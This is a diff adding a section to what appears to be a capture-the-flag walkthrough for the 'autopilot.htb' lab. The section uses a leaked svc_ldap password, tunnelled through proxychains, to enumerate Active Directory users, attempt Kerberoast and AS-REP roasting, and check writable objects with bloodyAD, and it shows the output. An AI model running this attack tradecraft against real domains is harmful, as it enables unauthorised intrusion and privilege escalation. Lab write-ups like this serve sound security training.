@@ -1234,6 +1234,69 @@ SMB  172.16.20.1  445  DC01  [*] Windows 11 / Server 2025 Build 26100 x64 (name:
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 5.7 AD enumeration with svc_ldap (why the standard roasts are dead ends here)
+
+The gromox LDAP config leaked a real domain credential, `svc_ldap`. Use it to enumerate the domain through the tunnel and find a path to a privileged account. All commands run on the attacker via `proxychains`.
+
+#### 5.7.1 Validate and enumerate users
+
+```bash
+proxychains -q netexec ldap 172.16.20.1 -u svc_ldap -p 'Brother6-Let-Ship-Been-Take'
+proxychains -q netexec ldap 172.16.20.1 -u svc_ldap -p 'Brother6-Let-Ship-Been-Take' --users
+```
+
+52 users are returned. The ones that matter confirm the onboarding email's hierarchy:
+
+| Account | Description | Note |
+| ------- | ----------- | ---- |
+| `sa-joshua.harris` | Sys Admin | Provisioned 2026-07-13, the promotion account |
+| `da-stephanie.lewis` | Domain Admin | The provisioner, final target |
+| `svc_smime` | (service) | S/MIME service account, matters for the mail route |
+| `svc_ldap` | (service) | The bind account already in hand |
+
+#### 5.7.2 Dead ends: Kerberoast, AS-REP, and svc_ldap ACLs
+
+```bash
+# Kerberoast: no user account has an SPN
+proxychains -q netexec ldap 172.16.20.1 -u svc_ldap -p 'Brother6-Let-Ship-Been-Take' --kerberoasting kerb.txt
+#   -> [*] Total of records returned 0
+proxychains -q impacket-GetUserSPNs -dc-ip 172.16.20.1 autopilot.htb/svc_ldap:'Brother6-Let-Ship-Been-Take' -request
+#   -> No entries found!
+
+# AS-REP roast: no pre-auth-disabled accounts
+proxychains -q netexec ldap 172.16.20.1 -u svc_ldap -p 'Brother6-Let-Ship-Been-Take' --asreproast asrep.txt
+#   -> No entries found!
+
+# What can svc_ldap write to?
+proxychains -q bloodyAD --host 172.16.20.1 -d autopilot.htb -u svc_ldap -p 'Brother6-Let-Ship-Been-Take' get writable
+```
+
+`bloodyAD get writable` returns only:
+
+```text
+CN=S-1-5-11,CN=ForeignSecurityPrincipals,...   WRITE   (Authenticated Users, trivial)
+CN=svc_ldap,OU=Service_Accounts,...            WRITE   (its own object)
+DC=20.16.172.in-addr.arpa,CN=MicrosoftDNS,...  CREATE_CHILD   (ADIDNS record creation)
+DC=autopilot.htb,CN=MicrosoftDNS,...           CREATE_CHILD
+DC=_msdcs.autopilot.htb,CN=MicrosoftDNS,...    CREATE_CHILD
+```
+
+So `svc_ldap` controls nothing that leads to `sa-joshua.harris`: it can write only its own object and the trivial `Authenticated Users` entry, plus create DNS records. This spawn has no SPN to roast and no AS-REP accounts, so the Kerberoast path some community writeups describe does not apply.
+
+**What this gives you:**
+
+- The two target identities confirmed: `sa-joshua.harris` (Sys Admin, the promotion account) and `da-stephanie.lewis` (Domain Admin, the goal).
+- Proof that `svc_ldap` cannot reach `sa-joshua.harris` through AD. The credential for `sa-joshua.harris` must be recovered from the mail server (owned as root): the S/MIME-protected provisioning email in his mailbox. Mail is the AD attack surface on this box.
+
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
